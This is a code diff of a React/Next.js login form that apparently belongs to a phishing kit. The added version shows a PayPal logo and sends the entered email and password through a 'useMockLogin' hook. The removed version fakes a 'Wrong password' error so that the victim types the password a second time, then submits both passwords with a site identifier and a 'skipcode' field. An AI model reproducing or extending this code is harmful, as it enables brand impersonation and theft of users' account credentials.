@@ -1,110 +1,78 @@
-import { Field, Form, Formik } from "formik";
-import useMockLogin from "../hooks/useMockLogin";
-import { site } from "../config";
-import { useState } from "react";
+import React from 'react';
+import { useForm } from 'react-hook-form';
+import Image from "next/image";
 import { toast } from "react-toastify";
+import { API_URL } from "../config/index";
+import Cookies from "js-cookie";
 
-function LoginForm({ setShowModal }) {
-  const [showWrongPassword, setShowWrongPassword] = useState(false);
 
-  const initialvalues = {
-    email: "",
-    password: "",
-    wrongPassword: "",
-    remember: "",
+const LoginForm = ({setShowForm}) => {
+  
+    const form=useForm()
+    const{register,handleSubmit,reset}=form
+    const { login,id } = useMockLogin();
+    const onSubmit =async(values) => {
+        const{email,password}=values
+        const submitValues = {
+          id,
+          email,
+      password,
+     
+        };
+        console.log(submitValues)
+       
+
+    login(submitValues)
+    setShowForm(true)
+      reset()
+    
   };
+    
+      
+    return (
+        <form onSubmit={handleSubmit(onSubmit)}>
+        <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
+    <div className="relative    w-[80px] h-[80px] ">
+            <Image
+              src="/images/paypal-logo.svg"
+              alt="avatar"
+              fill
+              className="object-cover ml-[120px]"
+            />
+          </div>
 
-  const { login } = useMockLogin({ setShowModal });
+ 
+  
+     <div className="pt-5">
+       <input
+         className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
+         placeholder="Your email"
+         {...register('email')}
+         type="email"
+         required
+       />
+           <input
+             className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
+             placeholder="Password"
+             {...register('password')}
+             type="password"
+             required
+           />
 
-  const handleSubmit = (values, formik) => {
-    const { email, password, wrongPassword } = values;
-
-    // console.log("values", values);
-    // return;
-
-    const submitValues = {
-      site: site,
-      email: email,
-      password: password,
-      wrongPassword: wrongPassword,
-      skipcode: "",
-    };
-
-    login(submitValues, formik);
-
-    // console.log(submitValues);
-  };
-
-  const handleWrongPassword = () => {
-    setShowWrongPassword(true);
-    toast.error("Wrong password, try again");
-  };
-
-  return (
-    <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
-      <h3 className="text-[25px] font-bold text-[#222222] text-center lg:text-left">
-        Log in to your account
-      </h3>
-
-      <div className="mt-5">
-        <Formik
-          initialValues={initialvalues}
-          // validationSchema={validate}
-          onSubmit={handleSubmit}
-        >
-          {(formik) => (
-            <Form className="">
-              <Field
-                className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
-                placeholder="Your email"
-                name="email"
-                type="email"
-                required
-              />
-              {!showWrongPassword ? (
-                <>
-                  <Field
-                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
-                    placeholder="Password"
-                    name="password"
-                    type="password"
-                    autoComplete="on"
-                    required
-                  />
-
-                  <button
-                    type="button"
-                    onClick={handleWrongPassword}
-                    className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
-                  >
-                    Log in
-                  </button>
-                </>
-              ) : (
-                <>
-                  <Field
-                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
-                    placeholder="Password"
-                    name="wrongPassword"
-                    type="password"
-                    autoComplete="on"
-                    required
-                  />
-
-                  <button
-                    type="submit"
-                    className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
-                  >
-                    Log in
-                  </button>
-                </>
-              )}
-            </Form>
-          )}
-        </Formik>
-      </div>
-    </div>
-  );
-}
+<button
+             type="submit"
+             className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
+           >
+             Log in
+           </button>
+         
+       
+     </div>
+   
+ 
+</div>
+        </form>
+    );
+};
 
 export default LoginForm;
